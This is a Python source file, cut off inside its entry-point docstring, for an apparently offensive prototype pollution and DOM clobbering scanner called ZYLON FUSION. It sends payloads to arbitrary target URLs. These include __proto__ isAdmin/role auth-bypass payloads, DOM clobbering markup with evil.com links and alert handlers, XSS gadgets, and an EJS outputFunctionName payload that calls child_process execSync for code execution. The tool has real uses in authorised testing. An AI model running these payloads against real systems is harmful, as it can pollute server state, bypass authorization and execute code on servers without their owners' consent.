#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - Prototype Pollution Engine
=================================================
Fused from: pp-finder (https://github.com/nickcano/pp-finder)
           + prototype-pollution-static-analysis
           + DOM-Clobber-Check (https://github.com/nickcano/DOM-Clobber-Check)
           + Custom Zylon Techniques
Capabilities:
  - Server-side prototype pollution detection
  - Client-side prototype pollution detection
  - Prototype pollution via URL parameters
  - Prototype pollution via JSON body
  - Prototype pollution via HTTP headers
  - DOM clobbering detection
  - Gadget chain identification
  - Source code analysis for pollution paths
  - Mass parameter testing for PP
  - Exploitation chain (PP to XSS/RCE)
Termux Compatible | No Root Required | Python 3.13+
"""

import os
import sys
import re
import json
import time
import copy
import threading
import hashlib
import random
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.var import (
    USER_AGENTS, DEFAULT_TIMEOUT, MAX_THREADS
)

from core.shared_infra import shared_session, regex_cache, PayloadInjector

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# PROTOTYPE POLLUTION PAYLOADS
# ============================================================================

# Server-side PP payloads (deep merge / recursive merge targets)
SERVER_PP_PAYLOADS = [
    # __proto__ pollution
    {"__proto__": {"zylonpolluted": "yes"}},
    {"__proto__": {"isAdmin": True}},
    {"__proto__": {"isAdmin": "true"}},
    {"__proto__": {"role": "admin"}},
    {"__proto__": {"isAdmin": 1}},
    # constructor.prototype pollution
    {"constructor": {"prototype": {"zylonpolluted": "yes"}}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    # Nested __proto__
    {"__proto__.__proto__": {"zylonpolluted": "yes"}},
    # Deeply nested
    {"a": {"__proto__": {"zylonpolluted": "yes"}}},
    # Array-based
    {"__proto__": ["zylonpolluted", "yes"]},
    # JSON injection via string
    '{"__proto__":{"zylonpolluted":"yes"}}',
]

# URL parameter PP payloads
URL_PP_PAYLOADS = [
    "__proto__[zylonpolluted]=yes",
    "__proto__[isAdmin]=true",
    "__proto__[isAdmin]=1",
    "__proto__[role]=admin",
    "constructor[prototype][zylonpolluted]=yes",
    "constructor[prototype][isAdmin]=true",
    "constructor[prototype][role]=admin",
    "__proto__.zylonpolluted=yes",
    "__proto__.isAdmin=true",
    # Nested
    "a[__proto__][zylonpolluted]=yes",
    "a[__proto__][isAdmin]=true",
]

# JSON body PP payloads (for POST/PUT requests)
JSON_PP_PAYLOADS = [
    json.dumps({"__proto__": {"zylonpolluted": "yes"}}),
    json.dumps({"__proto__": {"isAdmin": True}}),
    json.dumps({"__proto__": {"isAdmin": "true"}}),
    json.dumps({"__proto__": {"isAdmin": 1}}),
    json.dumps({"__proto__": {"role": "admin"}}),
    json.dumps({"constructor": {"prototype": {"zylonpolluted": "yes"}}}),
    json.dumps({"constructor": {"prototype": {"isAdmin": True}}}),
    json.dumps({"__proto__": {"zylonpolluted": "yes"}, "normal": "value"}),
    json.dumps({"a": {"b": {"__proto__": {"zylonpolluted": "yes"}}}}),
]

# HTTP header PP payloads
HEADER_PP_PAYLOADS = [
    {"X-Custom": json.dumps({"__proto__": {"zylonpolluted": "yes"}})},
    {"X-Config": json.dumps({"constructor": {"prototype": {"zylonpolluted": "yes"}}})},
    {"X-Data": "__proto__[zylonpolluted]=yes"},
    {"X-Input": '{"__proto__":{"zylonpolluted":"yes"}}'},
]

# Client-side PP detection payloads (HTML/JS injection)
CLIENT_PP_PAYLOADS = [
    # Via URL hash/params
    "?__proto__[zylonpolluted]=yes",
    "?constructor[prototype][zylonpolluted]=yes",
    "?__proto__.zylonpolluted=yes",
    # Via location.hash
    "#__proto__[zylonpolluted]=yes",
    "#constructor[prototype][zylonpolluted]=yes",
]

# DOM Clobbering detection patterns
DOM_CLOBBER_PATTERNS = [
    # Form-based DOM clobbering
    '<form id="config"><input name="isAdmin" value="true"></form>',
    '<form id="settings"><input name="debug" value="true"></form>',
    '<form name="document"><input name="cookie" value="clobbered"></form>',
    # Anchor-based DOM clobbering
    '<a id="config" href="https://evil.com"></a>',
    '<a id="redirect" href="https://evil.com"></a>',
    '<a name="admin" href="javascript:alert(1)"></a>',
    # Embed/Object based
    '<embed id="config" src="https://evil.com/config.json">',
    # Image-based
    '<img id="config" src=x onerror="alert(1)">',
    # Details-based
    '<details id="config" open ontoggle="alert(1)">',
]

# Known gadget chains (PP -> exploitation)
GADGET_CHAINS = [
    {
        "name": "PP to XSS via innerHTML",
        "description": "Prototype pollution of innerHTML or DOMPurify config to inject XSS",
        "pollution_path": "__proto__[innerHTML]",
        "exploitation": "If app reads Object.innerHTML from polluted prototype, XSS payload executes",
        "severity": "High",
    },
    {
        "name": "PP to XSS via srcdoc",
        "description": "Pollute iframe srcdoc property",
        "pollution_path": "__proto__[srcdoc]",
        "exploitation": "iframe srcdoc injection from prototype",
        "severity": "High",
    },
    {
        "name": "PP via lodash merge",
        "description": "lodash _.merge() / _.defaultsDeep() vulnerable to PP",
        "pollution_path": "__proto__",
        "exploitation": "lodash <4.17.12 merge/deepMerge allows __proto__ pollution",
        "severity": "Critical",
    },
    {
        "name": "PP via jQuery.extend",
        "description": "jQuery $.extend(true, ...) deep copy allows PP",
        "pollution_path": "__proto__",
        "exploitation": "jQuery <3.4.0 deep extend allows __proto__ pollution",
        "severity": "High",
    },
    {
        "name": "PP to RCE via child_process",
        "description": "Node.js: Pollute shell or envPath to achieve RCE",
        "pollution_path": "__proto__[shell] or __proto__[env][NODE_OPTIONS]",
        "exploitation": "If app spawns child_process with polluted options, RCE possible",
        "severity": "Critical",
    },
    {
        "name": "PP to EJS RCE",
        "description": "EJS template engine PP to RCE via outputFunctionName",
        "pollution_path": "__proto__[outputFunctionName]",
        "exploitation": "EJS <3.1.7: pollution of outputFunctionName leads to code execution",
        "severity": "Critical",
    },
    {
        "name": "PP to Pug RCE",
        "description": "Pug template engine PP via self variable",
        "pollution_path": "__proto__[self]",
        "exploitation": "Pug: pollution of self leads to code execution in template context",
        "severity": "Critical",
    },
    {
        "name": "PP to DoS via toString",
        "description": "Pollute toString/valueOf to cause DoS on object operations",
        "pollution_path": "__proto__[toString]",
        "exploitation": "Overriding toString causes exceptions when objects are stringified",
        "severity": "Medium",
    },
    {
        "name": "PP via Hapi.js Hoek",
        "description": "Hapi.js Hoek.merge vulnerable to PP",
        "pollution_path": "__proto__",
        "exploitation": "hoek <8.5.1 merge allows prototype pollution",
        "severity": "High",
    },
    {
        "name": "PP to auth bypass",
        "description": "Pollute isAdmin/role property for auth bypass",
        "pollution_path": "__proto__[isAdmin]",
        "exploitation": "If auth check reads user.isAdmin from prototype, bypass achieved",
        "severity": "Critical",
    },
]

# Source code patterns that indicate PP vulnerability
PP_SOURCE_PATTERNS = [
    (r'\.merge\s*\(', "lodash/jQuery merge() - potential deep merge PP"),
    (r'\.extend\s*\(\s*true', "jQuery deep extend - potential PP"),
    (r'\.defaultsDeep\s*\(', "lodash defaultsDeep - potential PP"),
    (r'\.set\s*\([^)]*__proto__', "Direct __proto__ set operation"),
    (r'Object\.assign\s*\(', "Object.assign (shallow, but verify)"),
    (r'JSON\.parse\s*\(', "JSON.parse - check if result is deep-merged"),
    (r'\.deepMerge\s*\(', "Custom deepMerge function - potential PP"),
    (r'recursiveMerge\s*\(', "Custom recursiveMerge - potential PP"),
    (r'for\s*\(\s*\w+\s+in\s+', "for...in loop without hasOwnProperty check"),
    (r'Object\.defineProperty\s*\(', "Object.defineProperty - verify property target"),
    (r'\.cloneDeep\s*\(', "lodash cloneDeep + merge combination"),
]


class PrototypeEngine:
    """Prototype Pollution Engine - Fused from pp-finder + DOM-Clobber-Check + Custom Techniques"""

    def __init__(self, timeout=DEFAULT_TIMEOUT, threads=MAX_THREADS, proxy=None):
        self.timeout = timeout
        self.threads = threads
        self.proxy = proxy
        self.session = shared_session
        self.lock = threading.Lock()
        self._baseline_response = None
        self._baseline_hash = None

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    # ========================================================================
    # HELPER: BASELINE CAPTURE
    # ========================================================================

    def _get_baseline(self, url):
        """Capture baseline response for comparison"""
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            self._baseline_response = {
                "status_code": resp.status_code,
                "content_length": len(resp.content),
                "headers": dict(resp.headers),
                "body_hash": hashlib.md5(resp.content).hexdigest(),
            }
            self._baseline_hash = self._baseline_response["body_hash"]
            return resp
        except Exception:
            return None

    def _is_response_different(self, resp):
        """Check if response differs from baseline"""
        if not self._baseline_response:
            return False
        current_hash = hashlib.md5(resp.content).hexdigest()
        return current_hash != self._baseline_hash

    # ========================================================================
    # SERVER-SIDE PROTOTYPE POLLUTION DETECTION
    # ========================================================================

    def detect_server_pp(self, url):
        """Server-side prototype pollution detection

        Tests for prototype pollution by sending payloads that
        attempt to modify Object.prototype on the server.

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Server-Side Prototype Pollution Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "payloads_tested": 0,
                "differential_responses": [],
                "pollution_attempts": [],
            },
            "scan_type": "server_pp",
        }

        # Get baseline
        self._print(f"  [*] Capturing baseline response...", CYAN)
        baseline = self._get_baseline(url)
        if not baseline:
            result["findings"].append({
                "type": "error",
                "description": f"Could not connect to {url}",
            })
            return result

        self._print(f"  [*] Baseline: {baseline.status_code}/{len(baseline.content)}B", DIM + CYAN)

        # Test 1: PP via JSON body (POST)
        self._print(f"  [*] Test 1: PP via JSON body (POST)...", CYAN)
        for payload in SERVER_PP_PAYLOADS:
            if isinstance(payload, str):
                payload_str = payload
            else:
                payload_str = json.dumps(payload)

            try:
                headers = {'Content-Type': 'application/json'}
                resp = self.session.post(
                    url, data=payload_str, headers=headers,
                    timeout=self.timeout, verify=False
                )
                result["details"]["payloads_tested"] += 1

                # Check for differential response
                if self._is_response_different(resp):
                    poll_info = {
                        "method": "POST_JSON",
                        "payload": payload_str[:150],
                        "status_code": resp.status_code,
                        "content_length": len(resp.content),
                        "baseline_hash": self._baseline_hash,
                        "response_hash": hashlib.md5(resp.content).hexdigest(),
                    }
                    result["details"]["differential_responses"].append(poll_info)
                    result["details"]["pollution_attempts"].append({
                        "payload": payload_str[:150],
                        "method": "POST_JSON",
                        "response_different": True,
                    })
                    self._print(f"  [!] Differential response detected (POST JSON)", YELLOW)

                    # Verify by checking if pollution persisted
                    verify_resp = self.session.get(url, timeout=self.timeout, verify=False)
                    if self._is_response_different(verify_resp):
                        result["vulnerable"] = True
                        result["findings"].append({
                            "type": "server_pp_json",
                            "severity": "Critical",
                            "description": f"Server-side prototype pollution via JSON body! "
                                          f"The server's Object.prototype may be polluted. "
                                          f"Payload: {payload_str[:100]}",
                            "payload": payload_str[:200],
                            "method": "POST_JSON",
                            "verified": True,
                        })
                        self._print(f"  [!!!] SERVER-SIDE PP CONFIRMED (JSON)!", RED)

            except Exception as e:
                pass

        # Test 2: PP via URL parameters
        self._print(f"  [*] Test 2: PP via URL parameters...", CYAN)
        pp_url_findings = self.test_via_params(url)
        if pp_url_findings.get("vulnerable"):
            result["vulnerable"] = True
            result["findings"].extend(pp_url_findings.get("findings", []))
        result["details"]["payloads_tested"] += pp_url_findings.get("details", {}).get("payloads_tested", 0)

        # Test 3: PP via HTTP headers
        self._print(f"  [*] Test 3: PP via HTTP headers...", CYAN)
        for header_payload in HEADER_PP_PAYLOADS:
            try:
                resp = self.session.get(
                    url, headers=header_payload,
                    timeout=self.timeout, verify=False
                )
                result["details"]["payloads_tested"] += 1

                if self._is_response_different(resp):
                    result["details"]["differential_responses"].append({
                        "method": "GET_HEADER",
                        "headers": header_payload,
                        "status_code": resp.status_code,
                    })
                    self._print(f"  [!] Differential response with header PP payload", YELLOW)

                    # Verify
                    verify_resp = self.session.get(url, timeout=self.timeout, verify=False)
                    if self._is_response_different(verify_resp):
                        result["vulnerable"] = True
                        result["findings"].append({
                            "type": "server_pp_header",
                            "severity": "Critical",
                            "description": f"Server-side PP via HTTP header! Headers: {header_payload}",
                            "headers": header_payload,
                            "verified": True,
                        })
                        self._print(f"  [!!!] SERVER-SIDE PP CONFIRMED (Header)!", RED)

            except Exception:
                pass

        # Test 4: PP via PUT/PATCH methods
        self._print(f"  [*] Test 4: PP via PUT/PATCH...", CYAN)
        for method in ['PUT', 'PATCH']:
            for payload in SERVER_PP_PAYLOADS[:5]:
                if isinstance(payload, str):
                    payload_str = payload
                else:
                    payload_str = json.dumps(payload)

                try:
                    headers = {'Content-Type': 'application/json'}
                    resp = self.session.request(
                        method, url, data=payload_str, headers=headers,
                        timeout=self.timeout, verify=False
                    )
                    result["details"]["payloads_tested"] += 1

                    if self._is_response_different(resp):
                        verify_resp = self.session.get(url, timeout=self.timeout, verify=False)
                        if self._is_response_different(verify_resp):
                            result["vulnerable"] = True
                            result["findings"].append({
                                "type": f"server_pp_{method.lower()}",
                                "severity": "Critical",
                                "description": f"Server-side PP via {method}! Payload: {payload_str[:100]}",
                                "payload": payload_str[:200],
                                "method": method,
                                "verified": True,
                            })
                            self._print(f"  [!!!] SERVER-SIDE PP CONFIRMED ({method})!", RED)
                except Exception:
                    pass

        if not result["vulnerable"]:
            self._print(f"  [-] No server-side prototype pollution detected", GREEN)

        return result

    # ========================================================================
    # CLIENT-SIDE PROTOTYPE POLLUTION DETECTION
    # ========================================================================

    def detect_client_pp(self, url):
        """Client-side prototype pollution detection

        Analyzes JavaScript source code for prototype pollution
        vulnerabilities and tests client-side PP vectors.

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Client-Side Prototype Pollution Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "js_files_analyzed": 0,
                "vulnerable_patterns": [],
                "pp_vectors": [],
            },
            "scan_type": "client_pp",
        }

        # Step 1: Fetch main page and extract JS files
        self._print(f"  [*] Fetching page and extracting JavaScript...", CYAN)
        js_files = []
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            html = resp.text

            # Extract script sources
            script_srcs = regex_cache.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE)
            for src in script_srcs:
                js_url = urljoin(url, src)
                js_files.append(js_url)

            # Extract inline scripts
            inline_scripts = regex_cache.findall(r'<script[^>]*>(.*?)</script>', html, re.IGNORECASE | re.DOTALL)
            for script in inline_scripts:
                # Analyze inline script for PP patterns
                self._analyze_js_for_pp(script, "inline", result)

        except Exception as e:
            result["findings"].append({
                "type": "error",
                "description": f"Failed to fetch main page: {str(e)[:100]}",
            })

        # Step 2: Analyze external JS files
        self._print(f"  [*] Analyzing {len(js_files)} JavaScript files...", CYAN)
        for js_url in js_files[:20]:  # Limit to 20 files
            try:
                resp = self.session.get(js_url, timeout=self.timeout, verify=False)
                if resp.status_code == 200:
                    result["details"]["js_files_analyzed"] += 1
                    self._analyze_js_for_pp(resp.text, js_url, result)
            except Exception:
                pass

        # Step 3: Test client-side PP via URL parameters
        self._print(f"  [*] Testing client-side PP vectors...", CYAN)
        for payload in CLIENT_PP_PAYLOADS:
            test_url = url + (payload if payload.startswith('?') or payload.startswith('#') else f"?{payload}")
            try:
                resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                # Check if the payload is reflected in the response
                for indicator in ['__proto__', 'zylonpolluted', 'constructor.prototype']:
                    if indicator in resp.text:
                        # Payload reflected - potential client-side PP
                        result["details"]["pp_vectors"].append({
                            "url": test_url,
                            "reflected_indicator": indicator,
                        })
                        self._print(f"  [!] PP payload reflected in response: {indicator}", YELLOW)
            except Exception:
                pass

        # Evaluate findings
        if result["details"]["vulnerable_patterns"]:
            result["vulnerable"] = True
            for pattern_info in result["details"]["vulnerable_patterns"]:
                result["findings"].append({
                    "type": "client_pp_pattern",
                    "severity": "High" if "deep" in pattern_info.get("description", "").lower() else "Medium",
                    "description": pattern_info["description"],
                    "source": pattern_info.get("source", "unknown"),
                    "line": pattern_info.get("line", "?"),
                })

        if not result["vulnerable"]:
            self._print(f"  [-] No client-side prototype pollution detected", GREEN)

        return result

    def _analyze_js_for_pp(self, js_code, source_name, result):
        """Analyze JavaScript code for prototype pollution patterns"""
        lines = js_code.split('\n')
        for line_num, line in enumerate(lines, 1):
            for pattern, description in PP_SOURCE_PATTERNS:
                try:
                    if regex_cache.search(pattern, line):
                        finding = {
                            "pattern": pattern,
                            "description": description,
                            "source": source_name,
                            "line": line_num,
                            "code_snippet": line.strip()[:200],
                        }
                        result["details"]["vulnerable_patterns"].append(finding)
                        self._print(f"  [!] PP pattern found in {source_name}:{line_num} - {description}", YELLOW)
                except re.error:
                    pass

    # ========================================================================
    # DOM CLOBBERING DETECTION
    # ========================================================================

    def detect_dom_clobber(self, url):
        """DOM clobbering detection

        Tests for DOM clobbering vulnerabilities where HTML elements
        can override global JavaScript variables and DOM properties.

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  DOM Clobbering Detection{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "clobberable_globals": [],
                "injection_points": [],
            },
            "scan_type": "dom_clobber",
        }

        # Step 1: Fetch page and analyze for DOM clobbering vectors
        self._print(f"  [*] Analyzing page for DOM clobbering vectors...", CYAN)
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            html = resp.text

            # Check for clobberable global variables
            # Common globals that can be clobbered
            clobberable_globals = [
                'config', 'settings', 'debug', 'admin', 'user',
                'document', 'window', 'location', 'navigator',
                'isAdmin', 'isLoggedIn', 'role', 'permissions',
                'API_URL', 'BASE_URL', 'ENDPOINT',
            ]

            for global_var in clobberable_globals:
                # Check if variable is referenced in JS
                pattern = rf'(?:var|let|const|window)\s*\.\s*{global_var}\b|{global_var}\s*[=.]'
                if regex_cache.search(pattern, html, re.IGNORECASE):
                    result["details"]["clobberable_globals"].append(global_var)

            # Check for input fields that could enable DOM clobbering
            form_inputs = regex_cache.findall(r'<input[^>]+name=["\']([^"\']+)["\']', html, re.IGNORECASE)
            for input_name in form_inputs:
                if input_name in clobberable_globals:
                    result["details"]["injection_points"].append({
                        "type": "form_input",
                        "name": input_name,
                        "clobber_target": input_name,
                    })

            # Check for id attributes that could clobber globals
            id_attrs = regex_cache.findall(r'<[^>]+id=["\']([^"\']+)["\']', html, re.IGNORECASE)
            for id_val in id_attrs:
                if id_val in clobberable_globals:
                    result["details"]["injection_points"].append({
                        "type": "element_id",
                        "id": id_val,
                        "clobber_target": id_val,
                    })

            # Step 2: Test DOM clobbering payloads via input reflection
            self._print(f"  [*] Testing DOM clobbering payloads...", CYAN)
            for payload in DOM_CLOBBER_PATTERNS[:5]:
                try:
                    # Test as parameter
                    test_url = f"{url}?test={quote(payload)}"
                    resp = self.session.get(test_url, timeout=self.timeout, verify=False)

                    # Check if payload is reflected without sanitization
                    if payload[:30] in resp.text:
                        result["findings"].append({
                            "type": "dom_clobber_reflection",
                            "severity": "Medium",
                            "description": f"DOM clobbering payload reflected in page. "
                                          f"Payload: {payload[:80]}",
                            "payload": payload[:200],
                            "reflected": True,
                        })
                        self._print(f"  [!] DOM clobbering payload reflected!", YELLOW)
                except Exception:
                    pass

        except Exception as e:
            result["findings"].append({
                "type": "error",
                "description": f"DOM clobber analysis failed: {str(e)[:100]}",
            })

        if result["details"]["clobberable_globals"]:
            result["vulnerable"] = True
            result["findings"].append({
                "type": "dom_clobber_globals",
                "severity": "Medium",
                "description": f"Found {len(result['details']['clobberable_globals'])} clobberable "
                              f"global variable(s): {result['details']['clobberable_globals'][:10]}. "
                              f"HTML elements with matching id/name can override these variables.",
                "globals": result["details"]["clobberable_globals"][:10],
            })

        if not result["vulnerable"]:
            self._print(f"  [-] No DOM clobbering vulnerabilities detected", GREEN)

        return result

    # ========================================================================
    # GADGET CHAIN FINDER
    # ========================================================================

    def find_gadget_chains(self, url):
        """Gadget chain identification for prototype pollution

        Identifies potential gadget chains that could be exploited
        through prototype pollution to achieve XSS, RCE, or auth bypass.

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  PP Gadget Chain Finder{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "technologies_detected": [],
                "applicable_gadgets": [],
                "js_analyzed": False,
            },
            "scan_type": "pp_gadget_chains",
        }

        # Step 1: Detect technologies
        self._print(f"  [*] Detecting technologies...", CYAN)
        detected_techs = []
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            html = resp.text
            headers = resp.headers

            # Check for Node.js/Express
            if 'x-powered-by' in headers:
                powered_by = headers['x-powered-by'].lower()
                if 'express' in powered_by:
                    detected_techs.append('Express.js')
                if 'next' in powered_by:
                    detected_techs.append('Next.js')
                if 'fastify' in powered_by:
                    detected_techs.append('Fastify')

            # Check for EJS
            if 'ejs' in html.lower() or 'x-powered-by: express' in headers.get('x-powered-by', '').lower():
                # EJS is commonly used with Express
                detected_techs.append('EJS (potential)')

            # Check for Pug
            if 'pug' in html.lower() or 'doctype html' in html.lower():
                detected_techs.append('Pug (potential)')

            # Check for jQuery
            if 'jquery' in html.lower():
                detected_techs.append('jQuery')

            # Check for lodash
            if 'lodash' in html.lower() or '_' in html and '.merge(' in html:
                detected_techs.append('lodash (potential)')

            # Check for React
            if 'react' in html.lower() or '__next_data__' in html.lower():
                detected_techs.append('React/Next.js')

            # Check for Vue
            if 'vue' in html.lower() or '__vue__' in html:
                detected_techs.append('Vue.js')

            # Check for DOMPurify
            if 'dompurify' in html.lower():
                detected_techs.append('DOMPurify')

        except Exception:
            pass

        result["details"]["technologies_detected"] = detected_techs
        self._print(f"  [*] Technologies: {detected_techs or ['Unknown']}", CYAN)

        # Step 2: Match gadget chains
        self._print(f"  [*] Matching gadget chains...", CYAN)
        applicable_gadgets = []

        tech_keywords = {
            'lodash': ['lodash'],
            'jQuery': ['jQuery'],
            'Express.js': ['Node.js', 'child_process'],
            'EJS': ['EJS'],
            'Pug': ['Pug'],
            'Next.js': ['Node.js'],
            'React/Next.js': ['React'],
        }

        for gadget in GADGET_CHAINS:
            gadget_applicable = False
            gadget_desc_lower = gadget["description"].lower()

            for tech in detected_techs:
                keywords = tech_keywords.get(tech, [tech.lower()])
                for keyword in keywords:
                    if keyword.lower() in gadget_desc_lower:
                        gadget_applicable = True
                        break

            # Also include generic gadgets (always applicable)
            if 'auth bypass' in gadget_desc_lower or 'DoS' in gadget["name"]:
                gadget_applicable = True

            if gadget_applicable:
                applicable_gadgets.append(gadget)

        # If no specific tech matches, include all medium+ severity gadgets
        if not applicable_gadgets and detected_techs:
            applicable_gadgets = [g for g in GADGET_CHAINS if g.get("severity") in ("Critical", "High")]

        result["details"]["applicable_gadgets"] = applicable_gadgets

        # Step 3: Test gadget chains
        self._print(f"  [*] Testing applicable gadget chains...", CYAN)
        for gadget in applicable_gadgets:
            # Test the pollution path specific to this gadget
            test_payloads = []
            if '__proto__[innerHTML]' in gadget.get("pollution_path", ""):
                test_payloads.append({"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}})
            elif '__proto__[srcdoc]' in gadget.get("pollution_path", ""):
                test_payloads.append({"__proto__": {"srcdoc": "<script>alert(1)</script>"}})
            elif '__proto__[outputFunctionName]' in gadget.get("pollution_path", ""):
                test_payloads.append({"__proto__": {"outputFunctionName": "console.log;process.mainModule.require('child_process').execSync('id')"}})
            elif '__proto__[shell]' in gadget.get("pollution_path", ""):
                test_payloads.append({"__proto__": {"shell": "/bin/bash"}})
            elif '__proto__[isAdmin]' in gadget.get("pollution_path", ""):
                test_payloads.append({"__proto__": {"isAdmin": True}})
            elif '__proto__[self]' in gadget.get("pollution_path", ""):
                test_payloads.append({"__proto__": {"self": True}})
            else:
                test_payloads.append({"__proto__": {"zylon_gadget_test": "yes"}})

            for payload in test_payloads:
                try:
                    headers = {'Content-Type': 'application/json'}
                    resp = self.session.post(
                        url, data=json.dumps(payload), headers=headers,
                        timeout=self.timeout, verify=False
                    )
                    # Check for errors or differential responses
                    if resp.status_code == 500:
                        result["findings"].append({
                            "type": "pp_gadget_error",
                            "severity": "High",
                            "description": f"Server error (500) when testing gadget '{gadget['name']}'. "
                                          f"This may indicate the gadget chain is applicable.",
                            "gadget": gadget["name"],
                            "pollution_path": gadget["pollution_path"],
                            "payload": json.dumps(payload)[:150],
                        })
                        result["vulnerable"] = True
                        self._print(f"  [!] Server error with gadget '{gadget['name']}' - may be applicable!", YELLOW)
                except Exception:
                    pass

        # Report applicable gadgets as findings
        for gadget in applicable_gadgets:
            result["findings"].append({
                "type": "pp_gadget_chain",
                "severity": gadget.get("severity", "Medium"),
                "description": f"Gadget chain: {gadget['name']} - {gadget['description']}",
                "gadget_name": gadget["name"],
                "pollution_path": gadget["pollution_path"],
                "exploitation": gadget["exploitation"],
            })
            if gadget.get("severity") in ("Critical", "High"):
                result["vulnerable"] = True

        if not applicable_gadgets:
            self._print(f"  [-] No applicable gadget chains found", GREEN)
        else:
            self._print(f"  [*] Found {len(applicable_gadgets)} applicable gadget chain(s)", CYAN)

        return result

    # ========================================================================
    # PP VIA URL PARAMETERS
    # ========================================================================

    def test_via_params(self, url):
        """Prototype pollution via URL parameters

        Tests for prototype pollution by injecting __proto__ and
        constructor.prototype via URL query parameters.

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  PP via URL Parameters{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "payloads_tested": 0,
                "differential_responses": [],
            },
            "scan_type": "pp_url_params",
        }

        # Get baseline
        self._get_baseline(url)

        for payload in URL_PP_PAYLOADS:
            test_url = f"{url}{'&' if '?' in url else '?'}{payload}"
            try:
                resp = self.session.get(test_url, timeout=self.timeout, verify=False)
                result["details"]["payloads_tested"] += 1

                if self._is_response_different(resp):
                    result["details"]["differential_responses"].append({
                        "payload": payload,
                        "url": test_url,
                        "status_code": resp.status_code,
                        "content_length": len(resp.content),
                    })
                    self._print(f"  [!] Differential response with: {payload[:60]}", YELLOW)

                    # Verify persistence
                    verify_resp = self.session.get(url, timeout=self.timeout, verify=False)
                    if self._is_response_different(verify_resp):
                        result["vulnerable"] = True
                        result["findings"].append({
                            "type": "pp_url_params",
                            "severity": "Critical",
                            "description": f"Prototype pollution via URL parameters! "
                                          f"Payload: {payload}. The pollution persists across requests.",
                            "payload": payload,
                            "verified": True,
                        })
                        self._print(f"  [!!!] PP VIA URL PARAMS CONFIRMED!", RED)

            except Exception:
                pass

        if not result["vulnerable"]:
            self._print(f"  [-] No PP via URL parameters detected", GREEN)

        return result

    # ========================================================================
    # PP VIA JSON BODY
    # ========================================================================

    def test_via_json(self, url):
        """Prototype pollution via JSON body

        Tests for prototype pollution by injecting __proto__ and
        constructor.prototype via JSON request bodies.

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  PP via JSON Body{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "payloads_tested": 0,
                "methods_tested": [],
            },
            "scan_type": "pp_json_body",
        }

        # Get baseline
        self._get_baseline(url)

        methods = ['POST', 'PUT', 'PATCH']

        for method in methods:
            self._print(f"  [*] Testing {method}...", CYAN)
            for payload in JSON_PP_PAYLOADS:
                try:
                    headers = {'Content-Type': 'application/json'}
                    resp = self.session.request(
                        method, url, data=payload, headers=headers,
                        timeout=self.timeout, verify=False
                    )
                    result["details"]["payloads_tested"] += 1

                    # Check for differential response
                    if self._is_response_different(resp):
                        # Verify persistence
                        verify_resp = self.session.get(url, timeout=self.timeout, verify=False)
                        if self._is_response_different(verify_resp):
                            result["vulnerable"] = True
                            result["findings"].append({
                                "type": f"pp_json_{method.lower()}",
                                "severity": "Critical",
                                "description": f"Prototype pollution via JSON body ({method})! "
                                              f"Payload: {payload[:100]}. Pollution persists across requests.",
                                "payload": payload[:200],
                                "method": method,
                                "verified": True,
                            })
                            result["details"]["methods_tested"].append(method)
                            self._print(f"  [!!!] PP VIA JSON ({method}) CONFIRMED!", RED)

                    # Also check for error-based detection
                    if resp.status_code == 500:
                        result["details"]["methods_tested"].append(method)
                        self._print(f"  [!] Server error (500) with {method} PP payload", YELLOW)

                except Exception:
                    pass

        if not result["vulnerable"]:
            self._print(f"  [-] No PP via JSON body detected", GREEN)

        return result

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='full', **kwargs):
        """Main entry point for Prototype Pollution Engine

        Args:
            target: Target URL or domain
